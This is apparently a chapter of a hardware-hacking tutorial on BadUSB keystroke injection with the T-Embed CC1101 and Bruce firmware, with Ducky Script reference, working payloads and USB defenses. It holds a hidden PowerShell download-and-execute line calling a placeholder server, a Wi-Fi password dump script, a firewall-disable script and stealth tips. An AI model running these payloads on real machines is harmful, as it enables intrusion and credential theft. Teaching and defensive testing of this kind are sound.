---
layout: default
title: "08 — BadUSB / HID"
nav_order: 9
---

# 08 — BadUSB / HID Attacks
{: .no_toc }

<details open markdown="block">
  <summary>Table of Contents</summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

---

## What Is BadUSB?

BadUSB is an attack technique where a USB device **impersonates a keyboard** (or other Human Interface Device) and injects keystrokes into a target computer at superhuman speed. To the operating system, the device appears to be a perfectly legitimate keyboard that someone is typing on extremely fast.

```
Normal USB Keyboard:
  Human types → Keyboard sends keystrokes → OS processes input
  Speed: ~80 WPM (6-7 characters/second)

BadUSB Attack:
  T-Embed executes script → Sends keystrokes as USB HID → OS processes input
  Speed: ~1000+ characters/second (limited only by USB polling rate)
```

The fundamental vulnerability is that **operating systems trust USB keyboards implicitly**. There is no authentication, no prompt, no confirmation. When a USB keyboard is plugged in, the OS immediately accepts its input — and it cannot distinguish between a human typing slowly and a malicious device injecting commands at full speed.

### Why the ESP32-S3 Makes This Possible

The ESP32-S3 in the T-Embed CC1101 includes **USB OTG (On-The-Go)** support — a native USB peripheral controller that can act as a USB device. This is not a simple serial adapter; it is a fully programmable USB device controller that can enumerate as:

- USB HID Keyboard
- USB HID Mouse
- USB HID Gamepad
- USB Mass Storage
- USB Composite Device (multiple classes simultaneously)

```
USB Connection:

  T-Embed CC1101                    Target Computer
  ┌────────────┐    USB-C Cable     ┌──────────────┐
  │ ESP32-S3   │◄──────────────────►│ USB Host     │
  │ USB OTG    │                    │ Controller   │
  │            │                    │              │
  │ Enumerates │  "I'm a keyboard" │ "OK, trusted │
  │ as HID     │ ──────────────────►│  keyboard!"  │
  │ Keyboard   │                    │              │
  │            │  Keystroke data    │ Processes as  │
  │ Sends      │ ──────────────────►│ normal typing │
  │ script     │                    │              │
  └────────────┘                    └──────────────┘
```

> **This is not a theoretical attack.** Commercial products like the USB Rubber Ducky ($80), Hak5 O.MG Cable ($120+), and Bash Bunny ($100) exist specifically for this purpose. The T-Embed provides similar functionality as part of its broader feature set.
{: .note }

---

## HID (Human Interface Device) Class

USB HID is a device class specification that defines how human interface devices communicate over USB. The HID class was designed for simplicity — plug in a keyboard, and it works immediately on any OS without installing drivers.

### HID Device Types

| HID Type | USB Usage Page | Description |
|:---|:---|:---|
| Keyboard | `0x07` | Standard keyboard with keycodes, modifiers |
| Mouse | `0x01` (Generic Desktop) | Relative/absolute movement, buttons, scroll |
| Gamepad | `0x01` (Generic Desktop) | Buttons, axes, hat switches |
| Consumer Control | `0x0C` | Media keys, volume, brightness |
| System Control | `0x01` | Power, sleep, wake |

### How HID Keyboard Works

When the T-Embed enumerates as a keyboard, it sends **HID reports** to the host computer:

```
USB HID Keyboard Report (8 bytes):
┌──────────┬──────────┬──────────┬──────────┬──────────┬──────────┬──────────┬──────────┐
│ Byte 0   │ Byte 1   │ Byte 2   │ Byte 3   │ Byte 4   │ Byte 5   │ Byte 6   │ Byte 7   │
│ Modifier │ Reserved │ Keycode1 │ Keycode2 │ Keycode3 │ Keycode4 │ Keycode5 │ Keycode6 │
│ Bitmask  │ (0x00)   │          │          │          │          │          │          │
└──────────┴──────────┴──────────┴──────────┴──────────┴──────────┴──────────┴──────────┘

Modifier Bitmask (Byte 0):
  Bit 0: Left Ctrl      Bit 4: Right Ctrl
  Bit 1: Left Shift     Bit 5: Right Shift
  Bit 2: Left Alt       Bit 6: Right Alt
  Bit 3: Left GUI (Win) Bit 7: Right GUI (Win)

Example: Ctrl+Alt+Delete
  Byte 0: 0b00000101 (Left Ctrl + Left Alt)
  Byte 2: 0x4C (Delete keycode)
  All other bytes: 0x00
```

Up to 6 keys can be pressed simultaneously (6-key rollover, or 6KRO). This is a hardware specification of the USB HID boot protocol.

### Why Operating Systems Trust HID Devices

```
The Trust Problem:

  USB Device Plugged In
         │
         ▼
  ┌──────────────────┐
  │ OS detects new   │
  │ USB device       │
  │                  │
  │ Class: HID       │
  │ Subclass: Boot   │──────► "It's a keyboard!"
  │ Protocol: Keyboard│
  └──────────────────┘
         │
         ▼                    No authentication.
  ┌──────────────────┐       No prompt.
  │ Load generic HID │       No user confirmation.
  │ keyboard driver   │       No delay.
  │                  │
  │ IMMEDIATELY ready │──────► Keystrokes are processed
  │ to accept input   │       as if a human is typing.
  └──────────────────┘
```

This implicit trust exists because:
1. Keyboards are essential input devices — prompting for permission would create a chicken-and-egg problem (how would you approve without a keyboard?).
2. The USB HID spec predates security concerns about malicious peripherals.
3. Backward compatibility requirements prevent adding authentication.

---

## Attack Scenarios

> **All attack scenarios described here are for authorized penetration testing only.** Executing BadUSB attacks against systems without explicit written authorization is a criminal offense under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent laws worldwide. Always obtain proper authorization before testing.
{: .danger }

### 1. Reverse Shell

The most powerful attack — establish remote command-line access to the target machine.

```
Attack Flow:
  T-Embed ──USB──► Target PC
       │              │
       │  Keystrokes   │  1. Open terminal/PowerShell
       │  ──────────►  │  2. Type download command
       │              │  3. Execute reverse shell payload
       │              │  4. Shell connects back to attacker
       │              │
       │              └──────────► Attacker's C2 Server
       │                           (receives shell)
       │
  Physical access        Remote access
  needed (seconds)       maintained (persistent)
```

### 2. Credential Exfiltration

Extract saved credentials from the target system:
- Wi-Fi passwords stored by the OS.
- Browser saved passwords (if not protected by master password).
- SSH keys or API tokens in known file locations.
- Environment variables containing secrets.

### 3. Payload Download and Execution

Download a program from the internet and execute it:

```
Sequence:
  1. Open Run dialog (Win+R) or terminal
  2. Type command to download payload:
     - PowerShell: Invoke-WebRequest
     - curl / wget (Linux/macOS)
     - certutil (Windows, no PowerShell needed)
  3. Execute the downloaded file
  4. Close all windows to hide evidence
```

### 4. System Modification

Modify system settings to weaken security:
- Disable firewall.
- Add a new administrator account.
- Enable remote desktop / SSH.
- Modify registry entries.
- Add scheduled tasks for persistence.
- Disable Windows Defender or other AV.

### 5. Data Exfiltration

Extract data from the target machine:
- Copy files to a USB drive (if the T-Embed also mounts as mass storage).
- Upload files to a remote server via curl/PowerShell.
- Email files to an attacker-controlled address.
- Encode sensitive data in DNS queries.

### 6. Backdoor Creation

Establish persistent access:
- Create a hidden user account with admin privileges.
- Install a scheduled task that re-establishes a reverse shell.
- Modify startup programs.
- Plant a persistent implant.

---

## Ducky Script Language

Ducky Script is the de facto standard scripting language for BadUSB payloads. Originally created for the **Hak5 USB Rubber Ducky**, it has been adopted by most BadUSB platforms including the Bruce firmware on the T-Embed.

### Script Basics

Ducky Script is line-based. Each line is a command. Commands are executed sequentially from top to bottom.

```
REM This is a comment — ignored during execution
DELAY 1000
REM Wait 1 second before starting

GUI r
REM Press Windows key + R to open Run dialog

DELAY 500
REM Wait for Run dialog to appear

STRING notepad.exe
REM Type "notepad.exe"

ENTER
REM Press Enter to execute

DELAY 1000
REM Wait for Notepad to open

STRING Hello from BadUSB!
REM Type the message
```

### Complete Command Reference

#### Text Input

| Command | Description | Example |
|:---|:---|:---|
| `STRING` | Types the following text as keyboard input | `STRING Hello World` |
| `STRINGLN` | Types text followed by Enter (some implementations) | `STRINGLN echo done` |

> `STRING` types **exactly** what follows on the line, including spaces. It does not press Enter afterward — use a separate `ENTER` command for that.
{: .note }

#### Key Presses

| Command | Key | Notes |
|:---|:---|:---|
| `ENTER` | Enter/Return | Confirms dialogs, submits commands |
| `TAB` | Tab | Switch focus, indent, autocomplete |
| `ESCAPE` | Escape | Cancel, close dialog |
| `SPACE` | Spacebar | Space character |
| `BACKSPACE` | Backspace | Delete character before cursor |
| `DELETE` | Delete | Delete character after cursor |
| `INSERT` | Insert | Toggle insert/overwrite mode |
| `HOME` | Home | Move to beginning of line |
| `END` | End | Move to end of line |
| `PAGEUP` | Page Up | Scroll up one page |
| `PAGEDOWN` | Page Down | Scroll down one page |
| `UP` or `UPARROW` | Up Arrow | Navigate up |
| `DOWN` or `DOWNARROW` | Down Arrow | Navigate down |
| `LEFT` or `LEFTARROW` | Left Arrow | Navigate left |
| `RIGHT` or `RIGHTARROW` | Right Arrow | Navigate right |
| `CAPSLOCK` | Caps Lock | Toggle caps lock |
| `NUMLOCK` | Num Lock | Toggle num lock |
| `SCROLLLOCK` | Scroll Lock | Toggle scroll lock |
| `PRINTSCREEN` | Print Screen | Screenshot |
| `PAUSE` or `BREAK` | Pause/Break | Pause execution |

#### Function Keys

| Command | Key |
|:---|:---|
| `F1` through `F12` | Function keys F1--F12 |

#### Modifier Keys

| Command | Key | Platform |
|:---|:---|:---|
| `GUI` or `WINDOWS` | Windows key / Command key | Windows: Win key; macOS: Cmd |
| `ALT` | Alt / Option | All platforms |
| `CTRL` or `CONTROL` | Control | All platforms |
| `SHIFT` | Shift | All platforms |

#### Modifier Combinations

Modifiers can be combined with other keys on the same line:

```
REM Single modifier + key:
GUI r                    REM Windows + R (Run dialog)
CTRL c                   REM Ctrl + C (copy)
ALT F4                   REM Alt + F4 (close window)
SHIFT INSERT             REM Shift + Insert (paste)

REM Multiple modifiers + key:
CTRL ALT DELETE          REM Ctrl + Alt + Delete
CTRL SHIFT ESCAPE        REM Ctrl + Shift + Escape (Task Manager)
GUI SHIFT s              REM Win + Shift + S (screenshot — Windows)
CTRL ALT t               REM Ctrl + Alt + T (terminal — Ubuntu)
```

#### Timing and Flow Control

| Command | Description | Example |
|:---|:---|:---|
| `DELAY` | Pause execution for N milliseconds | `DELAY 1000` (1 second) |
| `REPEAT` | Repeat the previous command N times | `REPEAT 10` |
| `REM` | Comment — not executed | `REM This is ignored` |
| `DEFAULT_DELAY` or `DEFAULTDELAY` | Set delay between every subsequent command (ms) | `DEFAULT_DELAY 100` |

> **Timing is critical.** If your script types commands before a window has opened, the keystrokes will be lost or typed into the wrong application. Always add `DELAY` commands after opening programs, dialogs, or switching windows. Slower computers need longer delays.
{: .warning }

### Recommended Delay Values

| Action | Minimum Delay | Safe Delay | Notes |
|:---|:---|:---|:---|
| After plugging in USB | 1,000 ms | 3,000 ms | OS needs time to enumerate device |
| After Win+R (Run dialog) | 300 ms | 500 ms | Dialog needs to appear and get focus |
| After opening terminal | 500 ms | 1,500 ms | Terminal emulator startup time |
| After opening application | 1,000 ms | 2,000 ms | Application loading time |
| Between keystrokes | 0 ms | 50 ms | Only if target drops fast keystrokes |
| After UAC prompt | 2,000 ms | 5,000 ms | User needs to click Yes (or script needs to navigate it) |

---

## Script Examples by Operating System

### Windows: Open PowerShell and Run a Command

```
REM ==========================================
REM Windows: Open PowerShell, run system info
REM ==========================================
REM Wait for USB enumeration
DELAY 2000

REM Open Run dialog
GUI r
DELAY 500

REM Launch PowerShell
STRING powershell
ENTER
DELAY 1500

REM Run a command
STRING Get-ComputerInfo | Select-Object CsName, OsName, OsVersion, OsArchitecture
ENTER

REM Wait for output
DELAY 2000
```

### macOS: Open Terminal via Spotlight

```
REM ==========================================
REM macOS: Open Terminal via Spotlight
REM ==========================================
REM Wait for USB enumeration
DELAY 2000

REM Open Spotlight (Cmd + Space)
GUI SPACE
DELAY 800

REM Type "Terminal"
STRING Terminal
DELAY 500

REM Press Enter to open Terminal
ENTER
DELAY 1500

REM Run a command
STRING echo "Hello from BadUSB on macOS" && uname -a
ENTER
```

> On macOS, Spotlight search (`Cmd + Space`) is the most reliable way to open applications via BadUSB. The Finder "Go to Folder" (`Cmd + Shift + G`) and Launchpad approaches are alternatives but less consistent.
{: .tip }

### Linux: Open Terminal via Keyboard Shortcut

```
REM ==========================================
REM Linux: Open terminal (Ubuntu/GNOME)
REM ==========================================
REM Wait for USB enumeration
DELAY 2000

REM Open terminal (Ctrl+Alt+T works on Ubuntu, Fedora, Mint)
CTRL ALT t
DELAY 1500

REM Run a command
STRING echo "Hello from BadUSB on Linux" && cat /etc/os-release
ENTER
```

> Linux terminal shortcuts vary by distribution and desktop environment. `Ctrl+Alt+T` works on Ubuntu/GNOME/MATE/Cinnamon. For KDE, it may be `Konsole`. For i3/Sway, the shortcut is user-configured. When targeting Linux, know the specific desktop environment.
{: .warning }

---

## Pre-Built Payloads in Bruce Firmware

Bruce firmware includes several pre-built BadUSB payloads. These are ready to use without writing custom scripts.

> Payload availability varies by firmware version. Update to the latest Bruce firmware for the most complete set of payloads.
{: .note }

### Common Built-In Payloads

| Payload | Target OS | Description |
|:---|:---|:---|
| **Hello World** | Cross-platform | Opens a text editor and types a message (proof of concept) |
| **Rick Roll** | Cross-platform | Opens a web browser to a specific YouTube URL |
| **Wi-Fi Password Dump** | Windows | Extracts saved Wi-Fi passwords using `netsh` commands |
| **System Info** | Windows/Linux/macOS | Gathers and displays system information |
| **Reverse Shell** | Windows (PowerShell) | Establishes a reverse TCP connection to a specified IP |
| **Wallpaper Change** | Windows | Downloads and sets a custom wallpaper image |
| **Disable Defender** | Windows | Attempts to disable Windows Defender (requires admin) |
| **Fork Bomb** | Windows/Linux | Creates a resource exhaustion loop (educational/destructive) |
| **Credential Harvester** | Windows | Creates a fake login prompt to capture credentials |

> **Before running any payload, read its source code and understand exactly what it does.** Never run unknown scripts on systems you care about. Some payloads are destructive and cannot be easily reversed.
{: .danger }

---

## Writing Custom Payloads

### Example 1: Windows — Notepad Hello World (Proof of Concept)

This is the simplest possible payload — a good starting point to verify your BadUSB setup works.

```
REM ==========================================
REM Payload: Hello World (Windows)
REM Target: Windows 10/11
REM Description: Opens Notepad and types a message
REM ==========================================

DELAY 2000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING === BadUSB Proof of Concept ===
ENTER
ENTER
STRING This text was typed by the T-Embed CC1101
ENTER
STRING acting as a USB keyboard.
ENTER
ENTER
STRING No human typed this.
ENTER
STRING It was injected at machine speed.
```

### Example 2: macOS — Terminal System Info

```
REM ==========================================
REM Payload: System Info (macOS)
REM Target: macOS 12+
REM Description: Opens Terminal, displays system info
REM ==========================================

DELAY 2000
GUI SPACE
DELAY 800
STRING Terminal
ENTER
DELAY 1500
STRING echo "=== System Information ===" && echo "" && echo "Hostname: $(hostname)" && echo "User: $(whoami)" && echo "OS: $(sw_vers -productName) $(sw_vers -productVersion)" && echo "Kernel: $(uname -r)" && echo "Architecture: $(uname -m)" && echo "Uptime: $(uptime)" && echo "IP: $(ifconfig en0 | grep 'inet ' | awk '{print $2}')"
ENTER
```

### Example 3: Windows — Download and Execute (Authorized Pentest)

> This payload downloads and executes a file from the internet. Only use in authorized penetration tests with explicit written permission. Replace the URL with your own controlled payload server.
{: .danger }

```
REM ==========================================
REM Payload: Download & Execute (Windows)
REM Target: Windows 10/11
REM Description: Downloads a file and executes it
REM WARNING: Authorized pentest use only!
REM ==========================================

DELAY 2000

REM Open PowerShell as administrator
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass -NoProfile -Command iwr https://YOUR-SERVER/payload.exe -OutFile $env:TEMP\payload.exe; Start-Process $env:TEMP\payload.exe'"
ENTER

REM Note: This will trigger a UAC prompt.
REM The user must click "Yes" for this to work.
REM Without admin interaction, the script will fail at UAC.
DELAY 5000
```

> **UAC (User Account Control) is a significant barrier** on modern Windows systems. The BadUSB script can request admin elevation, but the user must click "Yes" on the UAC prompt. On a locked/unattended machine, this popup will block execution. Some payloads avoid UAC by running in user-level context only.
{: .warning }

### Example 4: Cross-Platform — Rick Roll

A harmless demonstration payload that opens a web browser to a YouTube video.

```
REM ==========================================
REM Payload: Rick Roll (Cross-Platform)
REM Target: Windows, macOS, Linux
REM Description: Opens browser to a YouTube video
REM ==========================================

DELAY 2000

REM === WINDOWS ===
REM Open Run dialog and launch browser
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER

REM === Alternative for macOS ===
REM GUI SPACE
REM DELAY 800
REM STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
REM ENTER

REM === Alternative for Linux ===
REM CTRL ALT t
REM DELAY 1000
REM STRING xdg-open "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
REM ENTER
```

> This payload is OS-specific. The Windows version uses `Win+R` which opens URLs in the default browser. For macOS, use Spotlight. For Linux, use `xdg-open` in a terminal. You cannot reliably make a single script that works on all three platforms.
{: .note }

### Example 5: Windows — Extract Saved Wi-Fi Passwords

This is one of the most popular pentest payloads. It extracts all saved Wi-Fi network names and their plaintext passwords.

```
REM ==========================================
REM Payload: Wi-Fi Password Dump (Windows)
REM Target: Windows 10/11
REM Description: Extracts all saved Wi-Fi passwords
REM             and saves to a file on the desktop
REM ==========================================

DELAY 2000

REM Open PowerShell (not admin — user-level is fine)
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1500

REM Extract Wi-Fi profiles and passwords
STRING $outputFile = "$env:USERPROFILE\Desktop\wifi_passwords.txt"; $results = @(); (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); $password = (netsh wlan show profile name="$name" key=clear) | Select-String 'Key Content\W+:(.+)$'; $results += [PSCustomObject]@{ Network = $name; Password = if($password){ $password.Matches.Groups[1].Value.Trim() } else { 'N/A' } } }; $results | Format-Table -AutoSize | Out-String | Set-Content $outputFile; Write-Host "Saved to $outputFile"
ENTER

REM Wait for execution
DELAY 3000

REM Close PowerShell
STRING exit
ENTER
```

**What this does, step by step:**
1. Opens PowerShell (user-level, no admin needed).
2. Runs `netsh wlan show profiles` to list all saved Wi-Fi networks.
3. For each network, runs `netsh wlan show profile name="..." key=clear` to extract the plaintext password.
4. Formats the results as a table and saves to `wifi_passwords.txt` on the desktop.
5. Exits PowerShell.

> On Windows, saved Wi-Fi passwords are accessible to any user-level process via `netsh` without admin rights. This is a Windows design decision — the passwords are stored in the user's profile and accessible via the WLAN AutoConfig service. No UAC elevation is required.
{: .note }

### Example 6: macOS — Disable Firewall

```
REM ==========================================
REM Payload: Disable Firewall (macOS)
REM Target: macOS 12+
REM Description: Disables the macOS application firewall
REM WARNING: Requires the target's admin password!
REM ==========================================

DELAY 2000

REM Open Terminal via Spotlight
GUI SPACE
DELAY 800
STRING Terminal
ENTER
DELAY 1500

REM Disable firewall (requires sudo — password prompt will appear)
STRING sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
ENTER

REM !! PROBLEM: The script cannot type the admin password
REM !! because we don't know it. The sudo prompt will block
REM !! execution until the user types their password.
REM !!
REM !! This is a fundamental limitation of BadUSB on macOS:
REM !! any operation requiring sudo needs the user's password,
REM !! which the attacker typically doesn't have.

DELAY 10000
```

> **macOS limitation**: Unlike Windows where UAC shows a clickable dialog, macOS `sudo` requires typing the actual admin password. A BadUSB script cannot bypass this unless the attacker knows the target's password. This significantly limits the impact of BadUSB attacks on macOS for operations requiring elevated privileges.
{: .warning }

---

## Uploading Custom Scripts to the T-Embed

### Method 1: MicroSD Card

1. Write your Ducky Script in a text editor on your computer.
2. Save the file with a `.txt` or `.ducky` extension (firmware dependent).
3. Copy the file to the T-Embed's microSD card.
4. Insert the microSD card into the T-Embed.
5. Navigate to **BadUSB** > **Select Script** > browse to your file.

```
SD Card Layout:
/badusb/
├── hello_world.txt
├── wifi_dump.txt
├── sysinfo_win.txt
├── sysinfo_mac.txt
├── rickroll.txt
└── custom/
    ├── pentest_revshell.txt
    └── audit_script.txt
```

### Method 2: Web Interface (if supported)

Some Bruce firmware versions include a web interface accessible over Wi-Fi:
1. Connect the T-Embed to Wi-Fi (or use AP mode).
2. Access the web interface from your computer's browser.
3. Upload the script file through the web interface.
4. The file is saved to the T-Embed's storage.

### Script File Format

```
File: my_payload.txt
Encoding: UTF-8 (ASCII compatible)
Line endings: LF (\n) or CRLF (\r\n) — both typically accepted
No BOM (Byte Order Mark)

Content is plain-text Ducky Script commands, one per line.
```

> **Test on your own machine first.** Before using a BadUSB payload in any assessment, test it on your own computer to verify it works correctly with your OS version, keyboard layout, and timing. Adjust delays as needed.
{: .tip }

---

## Execution Timing and Detection

### The Time Factor

BadUSB attacks are a race against detection:

```
Timeline of a BadUSB Attack:

0.0s ─── USB plugged in
         │
0.5s ─── OS enumerates device as keyboard
         │
1.0s ─── Script begins execution
         │
1.5s ─── Run dialog / terminal opens
         │
2.0s ─── Command typed
         │
2.5s ─── Command executing
         │
3.0s ─── Payload active
         │
         ▼
  Total visible time: ~2-3 seconds
  Window visible: ~1-2 seconds

  A vigilant user might notice:
  - A flash of a command prompt / PowerShell window
  - Rapid text appearing on screen
  - The cursor moving by itself
  - A UAC prompt appearing unexpectedly
```

### Stealth Techniques

| Technique | Implementation | Effectiveness |
|:---|:---|:---|
| Minimize windows immediately | `STRING powershell -WindowStyle Hidden ...` | High — no visible window |
| Execute after screen lock | Wait for idle/screensaver, execute on wake | Medium — requires timing |
| Tiny execution window | Run everything in one long command | Medium — brief flash |
| Background execution | Use `Start-Process -WindowStyle Hidden` | High — process hidden |
| Clear evidence | Delete temp files, clear command history | Medium — forensics still possible |

### OS Boot Time Considerations

If plugging in the T-Embed during or shortly after boot:

| OS | Boot to HID Ready | Notes |
|:---|:---|:---|
| Windows 10/11 | 15--45 seconds | Login screen blocks most actions |
| macOS | 20--60 seconds | FileVault blocks pre-login |
| Linux | 10--30 seconds | Varies by distro and login manager |

> BadUSB attacks are most effective on **unlocked, logged-in** machines. An unattended, unlocked computer is the ideal target. Locked machines require the user's password, which the BadUSB script does not know.
{: .warning }

---

## OS-Specific Considerations

### Windows

| Factor | Details |
|:---|:---|
| **UAC** | Admin operations trigger a User Account Control prompt. Cannot be bypassed by BadUSB alone without user interaction. |
| **Execution Policy** | PowerShell may block script execution. Use `-ExecutionPolicy Bypass` flag. |
| **Windows Defender** | May detect and block known malicious commands. Real-time protection can quarantine downloaded payloads. |
| **SmartScreen** | Blocks execution of unrecognized downloaded executables. |
| **Command Prompt vs. PowerShell** | PowerShell is more powerful but may be restricted. `cmd.exe` is simpler and more widely available. |
| **Run Dialog** | `Win+R` opens Run dialog — accepts commands, URLs, and application names. |

**Windows attack surface summary:**

```
Windows BadUSB Entry Points:
┌─────────────────────────────────────────────┐
│                                             │
│  Win+R (Run Dialog) ──► cmd, powershell,    │
│                         URLs, executables   │
│                                             │
│  Win+X (Power User) ──► Terminal (Admin),   │
│                         Device Manager, etc.│
│                                             │
│  Ctrl+Shift+Esc ──────► Task Manager        │
│                                             │
│  Win (Start Menu) ────► Search, then type   │
│                         application name    │
│                                             │
│  Direct keystroke ────► Type in active       │
│                         application window  │
│                                             │
└─────────────────────────────────────────────┘
```

### macOS

| Factor | Details |
|:---|:---|
| **sudo** | Requires the user's password for admin actions. Cannot be bypassed. |
| **Gatekeeper** | Blocks execution of unsigned/unnotarized applications. |
| **SIP (System Integrity Protection)** | Prevents modification of critical system files even as root. |
| **Spotlight** | `Cmd+Space` opens Spotlight — best way to launch apps via BadUSB. |
| **Privacy Permissions** | Applications need explicit user approval for camera, microphone, screen recording, etc. |
| **Terminal access** | AppleScript via `osascript` can also open Terminal. |

**macOS-specific commands:**

```
REM Open Terminal via Spotlight
GUI SPACE
DELAY 800
STRING Terminal
ENTER

REM Alternative: Open Terminal via Finder
REM GUI SHIFT g
REM DELAY 500
REM STRING /Applications/Utilities/Terminal.app
REM ENTER

REM Alternative: Use osascript from Run dialog equivalent
REM (macOS doesn't have Run dialog — use Spotlight for everything)
```

### Linux

| Factor | Details |
|:---|:---|
| **sudo** | Requires password for admin actions (may have timeout from recent auth). |
| **Terminal shortcut** | Varies by DE: `Ctrl+Alt+T` (GNOME/MATE/Cinnamon), varies for KDE/i3/Sway. |
| **Root login** | Some distros disable root login entirely. |
| **SELinux/AppArmor** | May restrict actions even with root access. |
| **Package managers** | Vary by distro: apt, dnf, pacman, zypper. |
| **Display server** | X11 allows keystroke injection between windows; Wayland restricts this. |

### Chromebook

| Factor | Details |
|:---|:---|
| **ChromeOS** | Highly sandboxed environment. Limited attack surface. |
| **No traditional terminal** | Unless Linux (Crostini) is enabled. |
| **Web-focused** | Most actions limited to the browser. |
| **Keyboard shortcuts** | `Ctrl+Alt+T` opens crosh (limited shell). |
| **Developer mode** | Full shell access but usually not enabled. |

> Chromebooks are among the most resistant devices to BadUSB attacks due to ChromeOS's sandboxed architecture. Without Developer Mode enabled, the attack surface is essentially limited to browser-based actions.
{: .note }

---

## Keyboard Layout Considerations

### The Layout Problem

Ducky Script sends **keycodes**, not characters. A keycode for the key in the "Z" position on a US QWERTY keyboard will produce different characters on different keyboard layouts:

```
US QWERTY:   STRING Hello World!
             Sends keycodes for: H e l l o   W o r l d !

Target has German QWERTZ layout:
             Same keycodes produce: H e l l o   W o r l d !
             ✓ Mostly correct — but symbols shift!

             STRING @#$%^&
             US keycodes produce: "§$%&/( on German layout
             ✗ Wrong characters!

Target has French AZERTY layout:
             STRING Hello World!
             US keycodes produce: Hello Zorld!
             ✗ W and Z are swapped!
```

### Solutions

| Solution | Implementation | Limitation |
|:---|:---|:---|
| Match target layout | Set the script's layout to match the target | Must know target layout in advance |
| Use layout-agnostic methods | Alt codes on Windows (`Alt+0064` for @) | Slow, Windows-only |
| Avoid special characters | Use only a-z, 0-9, space, enter | Limits payload capability |
| Use encoded payloads | Base64 encode commands, decode on target | Adds complexity |

**Layout-agnostic PowerShell download (Windows):**

```
REM Use PowerShell with base64-encoded command to avoid layout issues
GUI r
DELAY 500
STRING powershell -EncodedCommand <BASE64_ENCODED_COMMAND>
ENTER
```

> **Always know your target's keyboard layout** before deploying a BadUSB payload. A script written for US QWERTY will produce garbled output on French AZERTY, German QWERTZ, or any other layout. Bruce firmware may allow setting the keyboard language in the BadUSB configuration.
{: .warning }

---

## Combining BadUSB with Other T-Embed Features

The T-Embed's multi-radio design allows combining BadUSB with other capabilities for more sophisticated (and authorized) attack chains.

### BadUSB + Wi-Fi Exfiltration

```
Attack Chain:
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│ 1. BadUSB   │────►│ 2. Extract  │────►│ 3. Exfil via│
│ opens       │     │ data via    │     │ T-Embed's   │
│ PowerShell  │     │ commands    │     │ Wi-Fi radio │
└─────────────┘     └─────────────┘     └─────────────┘

The T-Embed can:
1. Act as BadUSB to extract data from the target.
2. Simultaneously host a Wi-Fi AP or connect to a network.
3. Receive the exfiltrated data over Wi-Fi.
4. Store it locally or forward it.
```

### BadUSB + IR (Multi-Vector Assessment)

In an authorized physical penetration test:
1. Use IR to turn off room lights (if controlled by IR).
2. In the distraction, plug the T-Embed into an unlocked workstation.
3. Execute the BadUSB payload.
4. Unplug and leave.

> Multi-vector attacks should only be performed during authorized red team engagements with explicit scope agreements. Document every action taken.
{: .danger }

---

## Defense Against BadUSB

Understanding defenses is critical for both attackers (to understand limitations) and defenders (to protect systems).

### Physical Controls

| Defense | Description | Effectiveness |
|:---|:---|:---|
| **USB port blockers** | Physical plugs that block USB ports | High — prevents physical insertion |
| **USB port epoxy** | Permanently seal unused USB ports | High — destructive but effective |
| **Locked cases** | Computer cases that prevent access to ports | High — requires key/tool |
| **Kensington locks** | Prevent physical theft, often cover some ports | Medium |
| **Policy: no unknown USB** | User training to never plug in unknown devices | Low — humans are fallible |

### Software Controls

| Defense | Description | Platform |
|:---|:---|:---|
| **USBGuard** | Linux daemon that blocks unauthorized USB devices | Linux |
| **USB device whitelisting** | Only allow specific USB VID/PID combinations | Windows (GPO), Linux (udev), macOS |
| **Group Policy restrictions** | Block USB storage, restrict HID device installation | Windows |
| **Endpoint Detection (EDR)** | Detects rapid keystroke injection patterns | All platforms |
| **USB Keystroke Injection Detection** | Monitors for inhuman typing speeds | Specialized software |

### USBGuard (Linux)

```bash
# Install USBGuard
sudo apt install usbguard

# Generate initial policy from currently connected devices
sudo usbguard generate-policy > /etc/usbguard/rules.conf

# Start the daemon
sudo systemctl enable usbguard
sudo systemctl start usbguard

# Example policy rules:
# Allow only known keyboard VID:PID
allow id 046d:c52b  # Logitech USB Receiver
allow id 1d6b:0002  # Linux Foundation USB Hub
block  # Block everything else by default
```

### Windows Group Policy

```
To restrict USB HID devices via Group Policy:

1. Open gpedit.msc
2. Navigate to:
   Computer Configuration
   └── Administrative Templates
       └── System
           └── Device Installation
               └── Device Installation Restrictions

3. Enable: "Prevent installation of devices not described by other policy settings"
4. Enable: "Allow installation of devices that match these device IDs"
5. Add your known keyboard's Hardware ID (from Device Manager)

This blocks any new HID device from being recognized unless
its Hardware ID is explicitly whitelisted.
```

### macOS USB Restrictions

```
macOS does not have built-in USB device whitelisting at the OS level.
Third-party solutions include:

- Santa (by Google) — application allowlisting (blocks executed payloads)
- Objective-See tools (LuLu, BlockBlock, etc.)
- MDM (Mobile Device Management) profiles that restrict USB
- Apple Business Manager device enrollment
```

### Visual Inspection

```
Suspicious USB Device Checklist:

□ Is the device expected? Did someone intentionally plug it in?
□ Does it look like a normal USB device (flash drive, charger)?
□ Is it an unusual size, shape, or brand?
□ Does it have any visible electronics (PCB, chips)?
□ Is it plugged into a port that's not normally used?
□ Did it appear without explanation?

Known BadUSB form factors:
- USB Rubber Ducky (looks like a generic flash drive)
- O.MG Cable (looks like a normal USB cable — nearly undetectable)
- Hak5 Bash Bunny (looks like a chunky flash drive)
- T-Embed CC1101 (clearly not a normal USB device — visible screen)
- DIY Arduino/Teensy (varies widely)
- Malicious USB charger cable (indistinguishable from real cable)
```

> The most dangerous BadUSB devices, like the O.MG Cable, are physically indistinguishable from legitimate USB cables. Visual inspection is not a reliable defense against sophisticated adversaries.
{: .warning }

---

## Detection Methods

### Detecting BadUSB During Execution

| Detection Method | What It Catches | Limitation |
|:---|:---|:---|
| **Unexpected keyboard in Device Manager** | New HID device appearing without user action | Requires active monitoring |
| **Rapid keystroke detection** | Inhuman typing speed (>100 WPM sustained) | Legitimate macros also trigger |
| **New USB device alerts** | OS notification of new device connection | Users often dismiss these |
| **EDR/XDR monitoring** | Command execution patterns, process chains | Requires enterprise security tooling |
